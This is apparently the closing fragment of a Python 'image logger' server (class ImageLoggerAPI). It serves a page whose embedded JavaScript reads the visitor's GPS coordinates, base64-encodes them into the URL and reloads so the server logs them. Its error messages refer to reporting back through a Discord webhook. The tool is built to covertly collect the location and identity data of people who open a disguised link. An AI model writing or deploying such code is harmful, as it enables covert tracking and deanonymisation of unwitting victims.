        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
